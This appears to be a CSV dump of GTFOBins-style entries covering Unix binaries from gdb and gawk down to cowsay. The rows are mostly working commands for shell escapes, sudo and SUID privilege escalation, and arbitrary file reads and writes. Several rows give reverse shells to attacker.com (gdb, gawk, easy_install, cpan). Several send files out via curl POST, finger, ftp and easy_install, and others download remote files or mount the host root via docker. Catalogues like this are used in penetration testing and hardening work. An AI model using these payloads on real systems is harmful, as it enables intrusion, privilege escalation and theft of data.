RHOST=attacker.com export RPORT=12345 gdb -nx -ex 'python import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' -ex quit","","","","","This requires that GDB is compiled with Python support.","gdb -nx -ex 'python from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' -ex quit","","This requires that GDB is compiled with Python support.","./gdb -nx -ex 'python import os; os.setuid(0)' -ex '!sh' -ex quit","","","","","false"
"gcore","","","","","","sudo gcore $PID","It can be used to generate core dumps of running processes. Such files often contains sensitive information such as open files content, cryptographic keys, passwords, etc. This command produces a binary file named `core.$PID`, that is then often filtered with `strings` to narrow down relevant information.","","gcore $PID","","./gcore $PID","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gcloud","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","gcloud help !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo gcloud help !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gcc","","","gcc -wrapper /bin/sh,-s .","","","sudo gcc -wrapper /bin/sh,-s .","","","[''LFILE=file_to_read gcc -x c -E ""$LFILE"" ''-|-''LFILE=file_to_read gcc @""$LFILE"" '']","","","","LFILE=file_to_delete gcc -xc /dev/null -o $LFILE","","","","","","The file is read and parsed as a list of files (one per line), the content is disaplyed as error messages, thus this might not be suitable to read arbitrary data.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"gawk","","","gawk 'BEGIN {system(""/bin/sh"")}'","","","sudo gawk 'BEGIN {system(""/bin/sh"")}'","","","LFILE=file_to_read gawk '//' ""$LFILE""","","LFILE=file_to_read ./gawk '//' ""$LFILE""","","LFILE=file_to_write gawk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'","","./gawk 'BEGIN {system(""/bin/sh"")}'","","","","","","","Run `nc -l -p 12345` on the attacker box to receive the shell.","RHOST=attacker.com RPORT=12345 gawk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {     s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","","Run `nc target.com 12345` on the attacker box to connect to the shell.","LPORT=12345 gawk -v LPORT=$LPORT 'BEGIN {     s = ""/inet/tcp/"" LPORT ""/0/0"";     while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;     while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'","","","","","","","","","","","false"
"ftp","","","ftp !/bin/sh","","","sudo ftp !/bin/sh","","","","","","","","","","","Fetch a remote file from a FTP server.","RHOST=attacker.com ftp $RHOST get file_to_get","","","","","","","","","","Send local file to a FTP server.","RHOST=attacker.com ftp $RHOST put file_to_send","","","","","","","","","","","","","","","","","","false"
"fping","","","","","","LFILE=file_to_read sudo fping -f $LFILE","","","LFILE=file_to_read fping -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"fold","","","","","","LFILE=file_to_read sudo fold -w99999999 ""$LFILE""","","","LFILE=file_to_read fold -w99999999 ""$LFILE""","","LFILE=file_to_read ./fold -w99999999 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"fmt","","","","","This corrupts the output by wrapping very long lines at the given width.","LFILE=file_to_read sudo fmt -999 ""$LFILE""","The read file content is not binary-safe.","","[''LFILE=file_to_read fmt -pNON_EXISTING_PREFIX ""$LFILE"" ''-|-''LFILE=file_to_read fmt -999 ""$LFILE"" '']","","LFILE=file_to_read ./fmt -999 ""$LFILE""","","","","","","","","[''This only works for the GNU version of `fmt`.''-|-''This corrupts the output by wrapping very long lines at the given width.'']","This corrupts the output by wrapping very long lines at the given width.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"flock","","","flock -u / /bin/sh","","","sudo flock -u / /bin/sh","","","","","./flock -u / /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"fish","","","fish","","","sudo fish","","","","","./fish","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"finger","","","","","","","`finger` hangs waiting for the remote peer to close the socket.","","","","","","","","","","Fetch remote binary file from a remote TCP port. Run `base64 ""file_to_send"" | sudo nc -l -p 79` on the attacker box to send the file.","RHOST=attacker.com LFILE=file_to_save finger x@$RHOST | base64 -d > ""$LFILE""","","","","","","","","","","Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > ""file_to_save""` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.","RHOST=attacker.com LFILE=file_to_send finger ""$(base64 $LFILE)@$RHOST""","","","","","","","","","","","","","","","","","","false"
"find","","","find . -exec /bin/sh \; -quit","","","sudo find . -exec /bin/sh \; -quit","","","","","./find . -exec /bin/sh -p \; -quit","","LFILE=file_to_write find / -fprintf ""$FILE"" DATA -quit","","","","","","","","","","","","","","","","","DATA is a format string, it supports some escape sequences.","","","","","","","","","","","","","","","","","false"
"file","","","","","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.","LFILE=file_to_read sudo file -f $LFILE","","","[''LFILE=file_to_read file -f $LFILE ''-|-''LFILE=file_to_read file -m $LFILE '']","","LFILE=file_to_read ./file -f $LFILE","","","","","","","","[''Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.''-|-''Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.  If a line in the target file begins with a `#`, it will not be printed as these lines are parsed as comments.  It can also be provided with a directory and will read each file in the directory. '']","Each input line is treated as a filename for the `file` command and the output is corrupted by a suffix `:` followed by the result or the error of the operation, so this may not be suitable for binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"facter","","","TF=$(mktemp -d) echo 'exec(""/bin/sh"")' > $TF/x.rb FACTERLIB=$TF facter","","","TF=$(mktemp -d) echo 'exec(""/bin/sh"")' > $TF/x.rb sudo FACTERLIB=$TF facter","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"expect","","","expect -c 'spawn /bin/sh;interact'","","","sudo expect -c 'spawn /bin/sh;interact'","","","LFILE=file_to_read expect $LFILE","","./expect -c 'spawn /bin/sh -p;interact'","","","","","","","","The file is read and parsed as an `expect` command file, the content of the first invalid line is returned in an error message. Thus, this might not be suitable to read arbitrary binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"expand","","","","","","LFILE=file_to_read sudo expand ""$LFILE""","The read file content is corrupted by replacing tabs with spaces.","","LFILE=file_to_read expand ""$LFILE""","","LFILE=file_to_read ./expand ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"exiftool","","","","","","LFILE=file_to_write INPUT=input_file sudo exiftool -filename=$LFILE $INPUT","If the permissions allow it, files are moved (instead of copied) to the destination.","","LFILE=file_to_read OUTPUT=output_file exiftool -filename=$OUTPUT $LFILE cat $OUTPUT","","","","LFILE=file_to_write INPUT=input_file exiftool -filename=$LFILE $INPUT","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ex","","","ex !/bin/sh","","","sudo ex !/bin/sh","","","ex file_to_read ,p q","","","","ex file_to_write a DATA . w q","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"espeak","","","","","","LFILE=file_to_read sudo espeak -qXf ""$LFILE""","The file content appears in the middle of other textual information, thus it might not be suitable to read arbitray binary files.","","LFILE=file_to_read espeak -qXf ""$LFILE""","","LFILE=file_to_read ./espeak -qXf ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"eqn","","","","","","LFILE=file_to_read sudo eqn ""$LFILE""","The content is actually parsed and corrupted by the command, thus it may not be suitable for arbitrary files.","","LFILE=file_to_read eqn ""$LFILE""","","LFILE=file_to_read ./eqn ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"env","","","env /bin/sh","","","sudo env /bin/sh","","","","","./env /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"enscript","","","enscript /dev/null -qo /dev/null -I '/bin/sh >&2'","","","sudo enscript /dev/null -qo /dev/null -I '/bin/sh >&2'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"emacs","","","emacs -Q -nw --eval '(term ""/bin/sh"")'","","","sudo emacs -Q -nw --eval '(term ""/bin/sh"")'","","","emacs file_to_read","","./emacs -Q -nw --eval '(term ""/bin/sh -p"")'","","emacs file_to_write DATA C-x C-s","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"elvish","","","elvish","","","sudo elvish","","","export LFILE=file_to_read elvish -c 'echo (slurp <$E:LFILE)'","","./elvish","","export LFILE=file_to_write elvish -c 'echo DATA >$E:LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"efax","","","","","","LFILE=file_to_read sudo efax -d ""$LFILE""","The content is actually parsed by the command, thus it may not be suitable for reading arbitrary files.","","","","LFILE=file_to_read ./efax -d ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"ed","","","ed !/bin/sh","","","sudo ed !/bin/sh","","","ed file_to_read ,p q","","./ed file_to_read ,p q","","ed file_to_write a DATA . w q","","./ed !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"eb","","","eb logs !/bin/sh","","","sudo eb logs !/bin/sh","This invokes the default logging service, which is likely to be [`journalctl`](/gtfobins/journalctl/), other functions may apply. For this to work the target must be connected to AWS instance via EB-CLI.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"easy_install","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py easy_install $TF","","","TF=$(mktemp -d) echo ""import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')"" > $TF/setup.py sudo easy_install $TF","","","TF=$(mktemp -d) echo 'print(open(""file_to_read"").read())' > $TF/setup.py easy_install $TF","","","","export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""import os; os.execl('$(whereis python)', 'python', '-c', 'open(\""$LFILE\"",\""w+\"").write(\""DATA\"")')"" > $TF/setup.py easy_install $TF","","","","Fetch a remote file via HTTP GET request. The file path must be absolute.","export URL=http://attacker.com/file_to_get export LFILE=/tmp/file_to_save TF=$(mktemp -d) echo ""import os; os.execl('$(whereis python)', '$(whereis python)', '-c', \""\""\""import sys; if sys.version_info.major == 3: import urllib.request as r else: import urllib as r r.urlretrieve('$URL', '$LFILE')\""\""\"")"" > $TF/setup.py pip install $TF","The read file content is wrapped within program messages.","","","","","","","","","[''Send local file via ""d"" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.''-|-''Serve files in the local folder running an HTTP server.'']","[''export URL=http://attacker.com/ export LFILE=file_to_send TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import urllib.request as r, urllib.parse as u else: import urllib as u, urllib2 as r r.urlopen(e[""URL""], bytes(u.urlencode({""d"":open(e[""LFILE""]).read()}).encode()))' > $TF/setup.py easy_install $TF ''-|-''export LPORT=8888 TF=$(mktemp -d) echo 'import sys; from os import environ as e if sys.version_info.major == 3: import http.server as s, socketserver as ss else: import SimpleHTTPServer as s, SocketServer as ss ss.TCPServer(("""", int(e[""LPORT""])), s.SimpleHTTPRequestHandler).serve_forever()' > $TF/setup.py easy_install $TF '']","The file path must be absolute.","","Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.","export RHOST=attacker.com export RPORT=12345 TF=$(mktemp -d) echo 'import sys,socket,os,pty;s=socket.socket() s.connect((os.getenv(""RHOST""),int(os.getenv(""RPORT"")))) [os.dup2(s.fileno(),fd) for fd in (0,1,2)] pty.spawn(""/bin/sh"")' > $TF/setup.py easy_install $TF","","","","","","TF=$(mktemp -d) echo 'from ctypes import cdll; cdll.LoadLibrary(""lib.so"")' > $TF/setup.py easy_install $TF","","","","","","","","false"
"dvips","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' dvips -R0 texput.dvi","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' sudo dvips -R0 texput.dvi","The `texput.dvi` output file produced by `tex` can be created offline and uploaded to the target.","","","","","","","","tex '\special{psfile=""`/bin/sh 1>&0""}\end' ./dvips -R0 texput.dvi","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dstat","","","mkdir -p ~/.dstat echo 'import os; os.execv(""/bin/sh"", [""sh""])' >~/.dstat/dstat_xxx.py dstat --xxx","","","echo 'import os; os.execv(""/bin/sh"", [""sh""])' >/usr/local/share/dstat/dstat_xxx.py sudo dstat --xxx","`dstat` allows you to run arbitrary [`python`](/gtfobins/python/) scripts loaded as ""external plugins"" if they are located in one of the directories stated in the `dstat` man page under ""FILES"":  1. `~/.dstat/` 2. `(path of binary)/plugins/` 3. `/usr/share/dstat/` 4. `/usr/local/share/dstat/`  Pick the one that you can write into.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dpkg","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","dpkg -l !/bin/sh","","[''This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.''-|-''It runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'exec /bin/sh' > $TF/x.sh fpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF ``` '']","[''sudo dpkg -l !/bin/sh ''-|-''sudo dpkg -i x_1.0_all.deb'']","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dotnet","","","dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;","","","sudo dotnet fsi System.Diagnostics.Process.Start(""/bin/sh"").WaitForExit();;","","","export LFILE=file_to_read dotnet fsi System.IO.File.ReadAllText(System.Environment.GetEnvironmentVariable(""LFILE""));;","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dosbox","","","","","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","LFILE='\path\to\file_to_write' sudo dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","Basically `dosbox` allows to mount the local file system, so that it can be altered using DOS commands. Note that the DOS filename convention ([8.3](https://en.wikipedia.org/wiki/8.3_filename)) is used.","","[''LFILE='\path\to\file_to_read' dosbox -c 'mount c /' -c ""type c:$LFILE"" ''-|-''LFILE='\path\to\file_to_read' dosbox -c 'mount c /' -c ""copy c:$LFILE c:\tmp\output"" -c exit cat '/tmp/OUTPUT' '']","","LFILE='\path\to\file_to_write' ./dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","","LFILE='\path\to\file_to_write' dosbox -c 'mount c /' -c ""echo DATA >c:$LFILE"" -c exit","","","","","","[''The file content will be displayed in the DOSBox graphical window.''-|-''The file is copied to a readable location.'']","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","","","","","","","","","","Note that the name of the written file in the following example will be `FILE_TO_`. Also note that `echo` terminates the string with a DOS-style line terminator (`\r\n`), if that's a problem and your scenario allows it, you can create the file outside `dosbox`, then use `copy` to do the actual write.","","","","","","","","","","","","","","","","","false"
"dos2unix","","","","","","","","","","","","","LFILE1=file_to_read LFILE2=file_to_write dos2unix -f -n ""$LFILE1"" ""$LFILE2""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"docker","","The resulting is a root shell.","docker run -v /:/mnt --rm -it alpine chroot /mnt sh","","The resulting is a root shell.","sudo docker run -v /:/mnt --rm -it alpine chroot /mnt sh","This requires the user to be privileged enough to run docker, i.e. being in the `docker` group or being `root`.  Any other Docker Linux image should work, e.g., `debian`.","","CONTAINER_ID=""$(docker run -d alpine)""  # or existing TF=$(mktemp) docker cp file_to_read $CONTAINER_ID:$TF docker cp $CONTAINER_ID:$TF $TF cat $TF","","./docker run -v /:/mnt --rm -it alpine chroot /mnt sh","","CONTAINER_ID=""$(docker run -d alpine)"" # or existing TF=$(mktemp) echo ""DATA"" > $TF docker cp $TF $CONTAINER_ID:$TF docker cp $CONTAINER_ID:$TF file_to_write","","","","","","Read a file by copying it to a temporary container and back to a new location on the host.","The resulting is a root shell.","","","","","","","","","","Write a file by copying it to a temporary container and back to the target destination on the host.","","","","","","","","","","","","","","","","","false"
"dnf","","","","","It runs commands using a specially crafted RPM package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target. ``` TF=$(mktemp -d) echo 'id' > $TF/x.sh fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF ```","sudo dnf install -y x-1.0-1.noarch.rpm","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmsetup","","","","","","sudo dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF sudo dmsetup ls --exec '/bin/sh -s'","","","","","./dmsetup create base <<EOF 0 3534848 linear /dev/loop0 94208 EOF ./dmsetup ls --exec '/bin/sh -p -s'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmidecode","","","","","It can be used to overwrite files using a specially crafted SMBIOS file that can be read as a memory device by dmidecode. Generate the file with [dmiwrite](https://github.com/adamreiser/dmiwrite) and upload it to the target.  - `--dump-bin`, will cause dmidecode to write the payload to the destination specified, prepended with 32 null bytes.  - `--no-sysfs`, if the target system is using an older version of dmidecode, you may need to omit the option.  ``` make dmiwrite TF=$(mktemp) echo ""DATA"" > $TF ./dmiwrite $TF x.dmi ```","LFILE=file_to_write sudo dmidecode --no-sysfs -d x.dmi --dump-bin ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dmesg","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","dmesg -H !/bin/sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo dmesg -H !/bin/sh","","","LFILE=file_to_read dmesg -rF ""$LFILE""","","","","","","","","","","This is not suitable for binary files.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"distcc","","","distcc /bin/sh","","","sudo distcc /bin/sh","","","","","./distcc /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dig","","","","","","LFILE=file_to_read sudo dig -f $LFILE","Each input line is treated as a lookup query for the `dig` command and the output is corrupted with the result or errors of the operation, so this may not be suitable for binary files. Grepping for `DiG` might help to filter out unwanted content.","","LFILE=file_to_read dig -f $LFILE","","LFILE=file_to_read ./dig -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"diff","","","","","","LFILE=file_to_read sudo diff --line-format=%L /dev/null $LFILE","","","[''LFILE=file_to_read diff --line-format=%L /dev/null $LFILE ''-|-''LFOLDER=folder_to_list TF=$(mktemp -d) diff --recursive $TF $LFOLDER '']","","LFILE=file_to_read ./diff --line-format=%L /dev/null $LFILE","","","","","","","","This lists the content of a directory. `$TF` can be any directory, but for convenience it is better to use an empty directory to avoid noise output.","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dialog","","","","","","LFILE=file_to_read sudo dialog --textbox ""$LFILE"" 0 0","The file is shown in an interactive TUI dialog, thus it is not suitable for binary/too big data.","","LFILE=file_to_read dialog --textbox ""$LFILE"" 0 0","","LFILE=file_to_read ./dialog --textbox ""$LFILE"" 0 0","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"debugfs","","","debugfs !/bin/sh","","","sudo debugfs !/bin/sh","","","","","./debugfs !/bin/sh","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dd","","","","","","LFILE=file_to_write echo ""data"" | sudo dd of=$LFILE","","","LFILE=file_to_read dd if=$LFILE","","LFILE=file_to_write echo ""data"" | ./dd of=$LFILE","","LFILE=file_to_write echo ""DATA"" | dd of=$LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dc","","","dc -e '!/bin/sh'","","","sudo dc -e '!/bin/sh'","","","","","","","","","./dc -e '!/bin/sh'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"date","","","","","","LFILE=file_to_read sudo date -f $LFILE","Each line is corrupted by a prefix string and wrapped inside quotes, so this may not be suitable for binary files.  This only works for the GNU variant of `date`.","","LFILE=file_to_read date -f $LFILE","","LFILE=file_to_read ./date -f $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"dash","","","dash","","","sudo dash","","","","","./dash -p","","export LFILE=file_to_write dash -c 'echo DATA > $LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cut","","","","","","LFILE=file_to_read sudo cut -d """" -f1 ""$LFILE""","","","LFILE=file_to_read cut -d """" -f1 ""$LFILE""","","LFILE=file_to_read ./cut -d """" -f1 ""$LFILE""","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"curl","","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save sudo curl $URL -o $LFILE","","","LFILE=/tmp/file_to_read curl file://$LFILE","","URL=http://attacker.com/file_to_get LFILE=file_to_save ./curl $URL -o $LFILE","","LFILE=file_to_write TF=$(mktemp) echo DATA >$TF curl ""file://$TF"" -o ""$LFILE""","","","","Fetch a remote file via HTTP GET request.","URL=http://attacker.com/file_to_get LFILE=file_to_save curl $URL -o $LFILE","The file path must be absolute.","Fetch a remote file via HTTP GET request.","","","","","","","","Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Omit the `@` to send hard-coded data.","URL=http://attacker.com/ LFILE=file_to_send curl -X POST -d ""@$LFILE"" $URL","The file path must be absolute.","","","","","","","","","","","","","","","","","false"
"cupsfilter","","","","","","LFILE=file_to_read sudo cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","","LFILE=file_to_read cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","LFILE=file_to_read ./cupsfilter -i application/octet-stream -m application/octet-stream $LFILE","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"csvtool","","","csvtool call '/bin/sh;false' /etc/passwd","","","sudo csvtool call '/bin/sh;false' /etc/passwd","","","LFILE=file_to_read csvtool trim t $LFILE","","LFILE=file_to_read ./csvtool trim t $LFILE","","LFILE=file_to_write TF=$(mktemp) echo DATA > $TF csvtool trim t $TF -o $LFILE","","","","","","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.","","","","","","","","","","","The file is actually parsed and manipulated as CSV, so this might not be suitable for arbitrary data.","","","","","","","","","","","","","","","","","false"
"csplit","","","","","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","LFILE=file_to_read csplit $LFILE 1 cat xx01","","TF=$(mktemp) echo ""DATA"" > $TF LFILE=file_to_write csplit -z -b ""%d$LFILE"" $TF 1","","","","","","","","","","","","","","","","","Writes the data to `xx0file_to_write`. If needed, a different prefix can be specified with `-f` (instead of `xx`).","","","","","","","","","","","","","","","","","false"
"csh","","","csh","","","sudo csh","","","","","./csh -b","","export LFILE=file_to_write ash -c 'echo DATA > $LFILE'","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"crontab","","","","","The commands are executed according to the crontab file edited via the `crontab` utility.","sudo crontab -e","","","","","","","","","","","","","","","","","","","The commands are executed according to the crontab file edited via the `crontab` utility.","crontab -e","","","","","","","","","","","","","","","","","","","","","false"
"crash","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","crash -h !sh","","This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.","sudo crash -h !sh","","","","","","","","","","","","","","","","","","","","COMMAND='/usr/bin/id' CRASHPAGER=""$COMMAND"" crash -h","","","","","","","","","","","","","","","","","","","","","false"
"cpulimit","","","cpulimit -l 100 -f /bin/sh","","","sudo cpulimit -l 100 -f /bin/sh","","","","","./cpulimit -l 100 -f -- /bin/sh -p","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cpio","","","echo '/bin/sh </dev/tty >/dev/tty' >localhost cpio -o --rsh-command /bin/sh -F localhost:","","[''The whole directory structure is copied to `$TF`.''-|-''Copies `$LFILE` to the `$LDIR` directory.'']","[''echo '/bin/sh </dev/tty >/dev/tty' >localhost sudo cpio -o --rsh-command /bin/sh -F localhost: ''-|-''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | sudo cpio -R $UID -dp $TF cat ""$TF/$LFILE"" ''-|-''LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | sudo cpio -R 0:0 -p $LDIR'']","","","[''LFILE=file_to_read echo ""$LFILE"" | cpio -o ''-|-''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | cpio -dp $TF cat ""$TF/$LFILE"" '']","","[''LFILE=file_to_read TF=$(mktemp -d) echo ""$LFILE"" | ./cpio -R $UID -dp $TF cat ""$TF/$LFILE"" ''-|-''LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | ./cpio -R 0:0 -p $LDIR '']","","LFILE=file_to_write LDIR=where_to_write echo DATA >$LFILE echo $LFILE | cpio -up $LDIR","","","","","","[''The content of the file is printed to standard output, between the cpio archive format header and footer.''-|-''The whole directory structure is copied to `$TF`.'']","[''The whole directory structure is copied to `$TF`.''-|-''Copies `$LFILE` to the `$LDIR` directory.'']","","","","","","","","","","Copies `$LFILE` to the `$LDIR` directory.","","","","","","","","","","","","","","","","","false"
"cpan","","`cpan` lets you execute perl commands with the `! command`.","cpan ! exec '/bin/bash'","","","sudo cpan ! exec '/bin/bash'","","","","","","","","","","","Fetch a remote file via an HTTP GET request and store it in `PWD`.","export URL=http://attacker.com/file_to_get cpan ! use File::Fetch; my $file = (File::Fetch->new(uri => ""$ENV{URL}""))->fetch();","","","","","","","","","","Serve files in the local folder running an HTTP server on port 8080. Install the dependency via `cpan HTTP::Server::Simple`.","cpan ! use HTTP::Server::Simple; my $server= HTTP::Server::Simple->new(); $server->run();","","","Run `nc -lvp RPORT` on the attacker box to receive the shell.","export RHOST=localhost export RPORT=9000 cpan ! use Socket; my $i=""$ENV{RHOST}""; my $p=$ENV{RPORT}; socket(S,PF_INET,SOCK_STREAM,getprotobyname(""tcp"")); if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"">&S""); open(STDOUT,"">&S""); open(STDERR,"">&S""); exec(""/bin/sh -i"");};","","","","","","","","","","","","","","false"
"cp","","","","","[''This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)''-|-''This overrides `cp` itself with a shell (or any other executable) that is to be executed as root, useful in case a `sudo` rule allows to only run `cp` by path. Warning, this is a destructive action.'']","[''LFILE=file_to_write echo ""DATA"" | sudo cp /dev/stdin ""$LFILE"" ''-|-''LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF sudo cp $TF $LFILE ''-|-''sudo cp /bin/sh /bin/cp sudo cp'']","","","LFILE=file_to_read cp ""$LFILE"" /dev/stdout","","[''LFILE=file_to_write echo ""DATA"" | ./cp /dev/stdin ""$LFILE"" ''-|-''LFILE=file_to_write TF=$(mktemp) echo ""DATA"" > $TF ./cp $TF $LFILE ''-|-''LFILE=file_to_change ./cp --attributes-only --preserve=all ./cp ""$LFILE"" '']","","LFILE=file_to_write echo ""DATA"" | cp /dev/stdin ""$LFILE""","","","","","","","[''This can be used to copy and then read or write files from a restricted file systems or with elevated privileges. (The GNU version of `cp` has the `--parents` option that can be used to also create the directory hierarchy specified in the source path, to the destination folder.)''-|-''This can copy SUID permissions from any SUID binary (e.g., `cp` itself) to another.'']","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cowthink","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF cowthink -f $TF x","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowthink -f $TF x","It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
"cowsay","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF cowsay -f $TF x","","","TF=$(mktemp) echo 'exec ""/bin/sh"";' >$TF sudo cowsay -f $TF x","It allows to execute [`perl`](/gtfobins/perl) code, other functions may apply.","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","false"
